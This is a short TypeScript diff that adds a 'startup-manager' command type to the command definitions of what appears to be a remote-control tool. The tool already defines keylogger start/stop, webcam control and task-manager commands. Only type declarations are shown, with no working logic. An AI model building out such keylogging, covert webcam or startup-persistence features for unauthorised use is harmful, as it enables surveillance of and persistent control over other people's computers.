@@ -15,6 +15,7 @@ import type { ClientChatCommandPayload } from "./client-chat";
 import type { ToolActivationCommandPayload } from "./tool-activation";
 import type { WebcamCommandPayload } from "./webcam";
 import type { TaskManagerCommandPayload } from "./task-manager";
+import type { StartupCommandPayload } from "./startup-manager";
 import type { KeyloggerCommandPayload } from "./keylogger";
 import type { SystemInfoCommandPayload, SystemInfoSnapshot } from "./system-info";
 
@@ -36,7 +37,8 @@ export type CommandName =
   | "webcam-control"
   | "task-manager"
   | "keylogger.start"
-  | "keylogger.stop";
+  | "keylogger.stop"
+  | "startup-manager";
 
 export interface PingCommandPayload {
   message?: string;
@@ -86,7 +88,8 @@ export type CommandPayload =
   | ToolActivationCommandPayload
   | WebcamCommandPayload
   | TaskManagerCommandPayload
-  | KeyloggerCommandPayload;
+  | KeyloggerCommandPayload
+  | StartupCommandPayload;
 
 export interface CommandInput {
   name: CommandName;
